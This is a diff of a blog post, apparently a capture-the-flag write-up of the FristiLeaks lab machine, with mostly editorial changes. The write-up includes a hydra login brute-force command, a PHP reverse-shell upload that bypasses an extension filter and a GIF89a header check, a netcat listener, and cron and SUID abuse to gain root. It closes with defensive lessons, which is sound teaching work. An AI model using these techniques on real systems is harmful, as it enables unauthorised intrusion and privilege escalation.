@@ -133,33 +133,35 @@ kali@kali:~$ man base64
 kali@kali:~$ base64 -d b64.txt
 �PNG
 ▒
-IHDRm4�A�sRGB���gAMA��
-                      �a        pHYs���o�dRIDATx^��Qv� �a��
-                                                           �z��l&�I%KH�@f45�5��VI
-                                                                                 ���s��~���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/�����&������T3h��#3՗j�
-                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW$�o��y���{K}�f�P����9{�6�X��KKL>����a�%�ZD�
-��*�%&��Rxg�յ���V3]��#q�pz�R�\Zb�      -]�յ���JH5�9r(����I5se��G�tXq"k�6���j�����e׵�K����Z�t1n��               ���6��
+IHDRm4�A�sRGB���gAMA��                                                                                                                                                         
+                      �a        pHYs���o�dRIDATx^��Qv� �a��                                                                                                                    
+                                                           �z��l&�I%KH�@f45�5��VI                                                                                              
+                                                                                 ���s��~���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/�����&������T3h��#3՗j�              
+                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW$�o��y���{K}�f�P����9{�6�X��KKL>����a�%�ZD�                                                                                                                        
+'��*�%&��Rxg�յ���V3]��#q�pz�R�\Zb�      -]�յ���JH5�9r(����I5se��G�tXq"k�6���j�����e׵�K����Z�t1n��               ���6��                                                         
 F��n�T3W��ג���ߞ���j�                                                          �g=�Yx�i�bѢꍗj�ʒ�H-Y��ʯ��JH5Ӆx�D7(
                     ��ߠ�MI6�������D3�
                                      ������M���JH5ӅZ�l3�GY�d��M▒o6��T�rR�
                                                                          ��/�-��5ӅJ��I,�i9�l�Ѣ��Y��D���![
 
-�o����͹tWK}�f�h�����}d� [��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�\g}<���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��c�jƸdЖJ{<7
-����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��>��U騢"�3�jƼdȖ�ˆ#۞�����j��)�zUq��F>L�Z���[Z4���LZ�R}�f�ˑ����S;���|�������f.-������h��FEZ�T_��>�sd�a6�(.�U^n|/�����ZZ��=�#;t����T_��>Trd��+?���8�7�j-�}d��R�t!�#�[/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E�����Z�8�rqIEND�B`�
+�o����͹tWK}�f�h�����}d� [��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�\g}<���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��'c�jƸdЖJ{<7
+����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��>��U騢"�3�jƼdȖ�ˆ#۞�����j��)'�zUq��F>L�Z���[Z4���LZ�R}�f�ˑ����S;���|�������f.-������h��FEZ�T_��>�sd�a6�(.�U^n|/�����ZZ��=�#;t����T_��>Trd��+?���8�7�j-�}d��R�t!�#�[/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E�����Z�8�rqIEND�B`�
 ```
 
 Given that the notes from earlier mentioned how this way of encoding is used for images and the output above starts with `�PNG
-`, I `piped` the output to a new file which I gave the `png` extension. Opening that file showed the following:
+`, I `piped` the output to a new file which I gave the `.png` extension. Opening that file showed the following:
 
 ![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_decodedpic.png)
 
-This seemed like it could work as a password in the login form I found earlier. Now I only had to find the username, which turned out harder than I thought. I tried the usual ones like `admin`, `root`, `user`, etc. but no luck. I then even ran a bruteforce attempt on the login form using `hydra -L usernames.txt -p keKkeKKeKKeKkEkkEk 192.168.56.113 http-post-form '/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^:S=Wrong' -w 5 -W 1 -vV` but no matches found. This lead me to believe that the info I needed, again, would be hidden in plain sight somewhere. I took another look at the login form's page source and I noticed the name `eezeepz`. I gave that a try and sure enough, I was in:
+This seemed like it could work as a password in the login form I found earlier. Now I only had to find the username, which turned out harder than I thought.
+
+I tried the usual ones like `admin`, `root`, `user`, etc. but no luck. I then even ran a bruteforce attempt on the login form using `hydra -L usernames.txt -p keKkeKKeKKeKkEkkEk 192.168.56.113 http-post-form '/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^:S=Wrong' -w 5 -W 1 -vV` but no matches found. This lead me to believe that the info I needed, again, would be hidden in plain sight somewhere. I took another look at the login form's page source and I noticed the name `eezeepz`. I gave that a try and sure enough, I was in:
 
 ![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_loggedin.png)
 
-Since this gave me access to some kind of file upload application, I decided to upload a reverse PHP shell and then run it by visiting it via whatever path it would be uploaded to. The file upload application seemed to be whitelisting file extensions, which didn't allow `.php` files to be uploaded. This just meant I had to rename the reverse PHP shell to something ending in `.png`. I set up a listener on my Kali machine and then uploaded and opened the file via `192.168.56.113/uploads/php-reverse-shell.php.png`.
+Since this gave me access to some kind of file upload application, I decided to upload a reverse PHP shell and then run it by visiting it via whatever path it would be uploaded to. The file upload application seemed to be whitelisting file extensions, which didn't allow filenames ending in `.php` to be uploaded. This just meant I had to rename the reverse PHP shell to something ending in `.png`. I set up a listener on my Kali machine and then uploaded and opened the file via `192.168.56.113/uploads/php-reverse-shell.php.png`.
 
-Strangely enough this didn't work, despite the message I got telling me the upload was successful and should be found at `/uploads/`. Eventually I found out that on some websites, you can add `GIF89a;` to the header of your file to circumvent extra file checks being done. I did this and my listener finally caught a shell on the target's system:
+Strangely enough this didn't work, despite the message I got telling me the upload was successful and should be found at `/uploads/`. Eventually I found out that on some websites, you can add `GIF89a;` to the header of your file to circumvent extra file checks being done. I did this and my listener finally caught a low privilege shell on the target's system:
 
 ```sh
 kali@kali:~$ nc -nlvp 7777
@@ -175,7 +177,7 @@ whoami
 apache
 ```
 
-Looking around I found some `.txt` files with notes:
+I moved on to see how I could turn my limited privileges into full privileges. Looking around I found some `.txt` files with notes:
 
 ```sh
 sh-4.1$ ls ~
@@ -216,7 +218,7 @@ run every minute with my account privileges.
 - Jerry
 ```
 
-I tried giving myself read write and execute rights to the `/etc/sudoers` file by executing `echo "/home/admin/chmod 777 /etc/sudoers" > /tmp/runthis` but this didn't work. Whoever designed this machine probably had something more specific in mind so I gave myself full access to the `/home/admin` directory:
+I tried giving myself read, write and execute rights to the `/etc/sudoers` file by executing `echo "/home/admin/chmod 777 /etc/sudoers" > /tmp/runthis` but this didn't work. Whoever designed this machine probably had something more specific in mind so I gave myself full access to the `/home/admin` directory instead:
 
 ```sh
 sh-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
@@ -275,7 +277,7 @@ print cryptoResult
 
 This was going somewhere. All I would have to do was reverse the encrypted password (`=RFn0AKnlMHMPIzpyuTI0ITG`) to the original plaintext password by following the steps of `cryptpass.py` in reverse order. This meant 1) using the ROT13 cipher on it (ROT13 forward does the same as ROT13 backwards), 2) spelling the result of that in reverse (that's what `[::-1]` does) and 3) running `base64 -d` on the result of that. The outcome: `LetThereBeFristi!`.
 
-Because I remembered the `/home/fristigod` directory from earlier (and the name of the .txt file being `whoisyourgodnow.txt`), I checked if i could `sudo fristigod` with that password and sure enough:
+Because I remembered the `/home/fristigod` directory from earlier (and the name of the `.txt` file being `whoisyourgodnow.txt`), I checked if i could `sudo fristigod` with that password and sure enough:
 
 ```sh
 sh-4.1$ su fristigod
@@ -329,7 +331,8 @@ Nice try, but wrong user ;)
 bash-4.1$ sudo -u fristi ./doCom
 sudo -u fristi ./doCom
 [sudo] password for fristigod: LetThereBeFristi!
-Usage: ./program_name terminal_command ...bash-4.1$ whoami
+Usage: ./program_name terminal_command ...
+bash-4.1$ whoami
 whoami
 fristigod
 bash-4.1$ sudo -u fristi ./doCom /bin/bash
@@ -347,4 +350,4 @@ This machine had a lot more CTF-like features than the other ones I've done so f
 * Don't use base64 encoding, ROT13 ciphers or reverse ciphers for your passwords as an alternative to strong hashing and encryption algorithms, salting, etc.
 * Ideally, don't even store/mention usernames in places where doing so serves no function (and consider using something like an alias instead) - this makes bruteforcing a lot less viable as well, even when that didn't work in this particular situation
 * Don't openly store important code (such as code that clearly shows how password strings are stored)
-* Think twice about why, how and for who you create SUID executables, given how often these are exploited to gain full access of a target machine
+* Think twice about why, how and for who SUID executables should be created, given how often these are exploited to gain full access of a target machine
